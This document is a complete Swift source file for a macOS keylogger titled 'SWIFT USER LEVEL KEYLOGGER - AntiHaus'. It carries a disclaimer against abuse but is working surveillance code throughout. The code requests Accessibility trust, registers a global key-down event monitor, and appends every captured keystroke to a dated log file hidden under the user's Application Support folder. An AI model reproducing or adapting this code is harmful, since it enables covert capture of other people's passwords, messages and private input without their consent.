//
// SWIFT USER LEVEL KEYLOGGER - AntiHaus
//   _
// .~q`,
//{__,  \
//    \' \
//     \  \
//      \  \
//       \  `._            __.__
//        \    ~-._  _.==~~     ~~--.._
//         \        '                  ~-.
//          \      _-   -_                `.
//           \    /       }        .-    .  \
//            `. |      /  }      (       ;  \
//              `|     /  /       (       :   '\
//                \    |  /        |      /       \
//                 |     /`-.______.\     |^-.      \
//                 |   |/           (     |   `.      \_
//                 |   ||            ~\   \      '._    `-.._____..----..___
//                 |   |/             _\   \         ~-.__________.-~~~~~~~~~'''
//               .o'___/            .o______}

/* DISCLAIMER: AntiHaus ASSUMES NO LIABILITY WHATSOEVER AND DISCLAIMS ANY WARRANTY. THERE IS NO WARRANTY RELATING TO FITNESS FOR A PARTICULAR PURPOSE, MERCHANTABILITY, COPYRIGHT OR OTHER INTELLECTUAL PROPERTY RIGHT. */

/* THIS SOURCE IS PROVIDED AS IS. DON'T BE DICK. DON'T ABUSE IT OR OTHER PEOPLES PERSONAL COMPUTERS */

import Foundation
import Cocoa

// MARK: File Storage location.

private struct Constants {
    
    static let applicationDocumentsDirectoryName = "com.AntiHaus.phylakes"
    static let mainStoreFileName = "\(formatCurrentDateAsString()).txt"
    static let errorDomain = "CoreDataStackManager"
}

func formatCurrentDateAsString() ->NSString {
    var dateFormatter = NSDateFormatter()
    dateFormatter.dateFormat = "yyyy-MM-dd"
    let d = NSDate()
    let s = dateFormatter.stringFromDate(d)
    return s
}

// MARK: check file directory for logs.

    let fileManager = NSFileManager.defaultManager()
    let urls = fileManager.URLsForDirectory(.ApplicationSupportDirectory, inDomains: .UserDomainMask)
    var applicationSupportDirectory = urls[urls.count - 1] as NSURL
    applicationSupportDirectory = applicationSupportDirectory.URLByAppendingPathComponent(Constants.applicationDocumentsDirectoryName)
    
    var URLinString = applicationSupportDirectory.absoluteString
    
    let absoluteString = applicationSupportDirectory.absoluteString as String!
    
    let replaced =  absoluteString.stringByReplacingOccurrencesOfString("file://", withString: "", options: nil, range: nil)
    
    let fullApplicationSupportPathSting = replaced.stringByReplacingPercentEscapesUsingEncoding(NSUTF8StringEncoding)!
    
    var applicationDocumentsDirectory: NSURL? = {
        
        var error: NSError?
        
        if let properties = applicationSupportDirectory.resourceValuesForKeys([NSURLIsDirectoryKey], error: &error) {
            
            if let isDirectory = properties[NSURLIsDirectoryKey] as? NSNumber {
                
                if !isDirectory.boolValue {
                    
                    let description = NSLocalizedString("Could not access the application data folder.", comment: "Failed to initialize applicationSupportDirectory")
                    
                    let reason = NSLocalizedString("Found a file in its place.", comment: "Failed to initialize applicationSupportDirectory")
                    
                    let userInfo = [
                        NSLocalizedDescriptionKey: description,
                        NSLocalizedFailureReasonErrorKey: reason
                    ]
                    
                    error = NSError(domain: Constants.errorDomain, code: 101, userInfo: userInfo)
                    println(error)
                    fatalError("Could not access the application data folder.")

                    return nil
                }
            }
        }
            
        else {
            if error != nil && error!.code == NSFileReadNoSuchFileError {
                let ok = fileManager.createDirectoryAtPath(applicationSupportDirectory.path!, withIntermediateDirectories: true, attributes: nil, error: &error)
                if !ok {
                    
                    println(error)
                    
                    fatalError("Could not create the application log folder.")
                    
                    return nil
                }
            }
        }
        
        return applicationSupportDirectory
        }()

// MARK: Write stream to file

func logWriter(writeToLine: String)   {
    
    let folder = fullApplicationSupportPathSting
    let path = folder.stringByAppendingPathComponent(Constants.mainStoreFileName)
    
    
    if let outputStream = NSOutputStream(toFileAtPath: path, append: true) {
        
        outputStream.open()
        outputStream.write("\(writeToLine)")
        outputStream.close()
        
    } else {
        println("Unable to open file")
    }
    
}

// MARK: Acquire Privleges

func acquirePrivileges() -> Bool {
    
    let accessEnabled = AXIsProcessTrustedWithOptions([kAXTrustedCheckOptionPrompt.takeUnretainedValue() as String: true])
    
    if accessEnabled != 1 {
        println("You need to enable the keylogger in the System Prefrences")
    }
    
    return accessEnabled == 1
}

// MARK: Key Input from EventHandler to file


func handlerEvent(aEvent: (NSEvent!)) -> Void {
    
        let stringBuilder = aEvent.characters!
        logWriter("\(stringBuilder)")
}

// MARK: Event Monitor

func listenForEvents() {
    let mask = (NSEventMask.KeyDownMask)
    let eventMonitor: AnyObject! = NSEvent.addGlobalMonitorForEventsMatchingMask(mask, handlerEvent)
}


class ApplicationDelegate: NSObject, NSApplicationDelegate {
    func applicationDidFinishLaunching(notification: NSNotification?) {
        println("Starting logging on \(formatCurrentDateAsString())")
        acquirePrivileges()
        listenForEvents()
    }
}


let application = NSApplication.sharedApplication()

let applicationDelegate = ApplicationDelegate()
application.delegate = applicationDelegate
application.activateIgnoringOtherApps(true)
application.run()


